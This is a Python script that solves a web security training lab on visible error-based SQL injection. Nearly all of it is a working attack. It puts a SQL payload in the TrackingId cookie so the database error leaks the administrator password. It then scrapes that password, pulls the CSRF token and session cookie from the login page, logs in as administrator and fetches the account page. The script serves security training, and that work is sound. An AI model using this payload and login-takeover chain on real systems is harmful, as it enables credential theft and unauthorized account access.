"""
  Lab: Visible error-based SQL injection

  Steps:
  1. Inject payload into 'TrackingId' cookie to make the database return an error containing the administrator password
  2. Extract the administrator password
  3. Fetch the login page
  4. Extract the csrf token and session cookie
  5. Login as the administrator
  6. Fetch the administrator profile

  Author: D4mn20
"""
import argparse
import requests
from colorama import Fore
import re
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help='Target URL')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    # Configure session with proxy if provided
    session = requests.session()
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        session.proxies = proxies
    session.verify = False

    print("⦗#⦘ Injection point: " + Fore.YELLOW + "TrackingId")
    print(Fore.WHITE + "⦗1⦘ Injecting payload to retrieve the administrator password.. ", end="", flush=True)

    payload = "'%3bSELECT CAST((select password from users limit 1) AS int)-- -"
    cookies = { "TrackingId": payload }
    injection = fetch("/filter?category=Pets", session, args.url, cookies)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting administrator password.. ", end="", flush=True)

    admin_password = re.findall("integer: \"(.*)\"", injection.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
    print(Fore.WHITE + "⦗3⦘ Fetching the login page.. ", end="", flush=True)

    login_page = fetch("/login", session, args.url)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)
    
    session_cookie = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Logging in as the administrator.. ", end="", flush=True)

    data = { "username": "administrator", "password": admin_password, "csrf": csrf_token }
    cookies = { "session": session_cookie }
    admin_login = post_data("/login", data, cookies, session, args.url)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Fetching the administrator profile.. ", end="", flush=True)

    admin_session = admin_login.cookies.get("session")
    cookies = { "session": admin_session }
    fetch("/my-account", session, args.url, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, session, url, cookies = None):
    try:  
        return session.get(f"{url}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies, session, url, headers = None):
    try:    
        return session.post(f"{url}{path}", data, cookies=cookies, headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()